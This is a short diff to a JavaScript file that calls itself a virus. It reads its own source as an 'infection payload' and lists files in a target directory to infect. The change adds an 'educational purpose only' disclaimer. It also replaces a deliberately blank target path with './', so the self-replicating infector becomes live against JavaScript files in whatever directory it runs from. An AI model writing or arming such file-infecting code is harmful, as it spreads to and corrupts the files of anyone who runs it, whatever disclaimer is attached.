@@ -1,6 +1,11 @@
 // #virus.js
 // the line above will be used for marking a file as infected
 
+/*
+* Program created for entertainment and educational purpose only
+* WARNING: EXECUTE THIS FILE AT YOUR OWN RISK :WARNING
+*/
+
 // this mild-mannered virus leaves the global namespace alone and creates its own closure
 (function() {
 
@@ -19,8 +24,7 @@
   var infection_payload = fs.readFileSync(__filename);
 
   // where to look for files to infect
-  // target_path is intentionally left blank, set the target of your own
-  var target_path = '';
+  var target_path = './';
 
   // start infecting .js file
   var files = fs.readdirSync(target_path);
